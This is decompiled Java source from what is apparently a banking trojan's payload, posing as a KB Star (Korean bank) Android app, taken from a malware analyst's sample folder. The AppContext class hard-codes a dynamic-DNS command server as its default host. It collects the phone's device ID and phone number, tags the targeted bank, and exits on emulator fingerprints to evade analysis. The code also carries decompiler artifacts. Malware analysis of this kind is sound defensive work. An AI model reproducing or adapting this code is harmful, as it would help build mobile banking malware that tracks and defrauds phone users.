package com.kbstar.kb.android.star;

import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.telephony.TelephonyManager;
import com.kbstar.kb.android.star.util.LogUtil;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.Properties;

public class AppContext
  extends Application
{
  public static final String SYSTEM_CONFIG = "config";
  public static final String SYS_CONFIG_FILE_NAME = "config.properties";
  public static String bankName;
  public static String deviceId;
  public static String phoneIdentity;
  public static String serverIP;
  public SharedPreferences preferences;
  public TelephonyManager telephonyManager;
  
  private String getDefIP()
  {
    String str1 = "imteakbe.vicp.co";
    str2 = str1;
    try
    {
      BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(getApplicationContext().getResources().openRawResource(2131099648)));
      for (;;)
      {
        str2 = str1;
        Object localObject = localBufferedReader.readLine();
        if (localObject == null)
        {
          str2 = str1;
          localBufferedReader.close();
          return str1;
        }
        str2 = str1;
        localObject = ((String)localObject).split("=");
        str2 = str1;
        if (localObject.length == 2)
        {
          str2 = str1;
          if (localObject[0].startsWith("xmpp")) {
            str1 = localObject[1];
          }
        }
      }
      return str2;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  private void initConfiguration(Properties paramProperties)
  {
    paramProperties.list(System.out);
    serverIP = paramProperties.getProperty("xmpp", getDefIP());
    AppContacts.initWebServiceUrl(serverIP);
  }
  
  public void initConfiguration()
  {
    LogUtil.i("init system configuration args..........");
    Object localObject = new File(getApplicationContext().getFilesDir(), "config.properties");
    Properties localProperties = new Properties();
    try
    {
      if (!((File)localObject).exists())
      {
        LogUtil.i("create system configuration for [" + localObject + "].");
        ((File)localObject).createNewFile();
        localProperties.load(getApplicationContext().getResources().openRawResource(2131099648));
        initConfiguration(localProperties);
        localObject = new FileOutputStream((File)localObject);
        localProperties.store((OutputStream)localObject, "");
        ((FileOutputStream)localObject).close();
        return;
      }
      LogUtil.i("load system configuration for [" + localObject + "].");
      localProperties.load(new FileInputStream((File)localObject));
      initConfiguration(localProperties);
      return;
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
    }
  }
  
  public void onCreate()
  {
    this.preferences = getSharedPreferences("config", 0);
    initConfiguration();
    try
    {
      this.telephonyManager = ((TelephonyManager)getSystemService("phone"));
      deviceId = "deviceid:" + this.telephonyManager.getDeviceId();
      phoneIdentity = this.telephonyManager.getLine1Number();
      bankName = "KB";
      if ((phoneIdentity.startsWith("15555")) || (deviceId.startsWith("00000000")))
      {
        System.exit(0);
        return;
      }
      if ((phoneIdentity == null) || (phoneIdentity.trim().equals("")))
      {
        phoneIdentity = deviceId;
        return;
      }
    }
    catch (Throwable localThrowable)
    {
      LogUtil.e(localThrowable.getMessage(), localThrowable);
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/AppContext.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */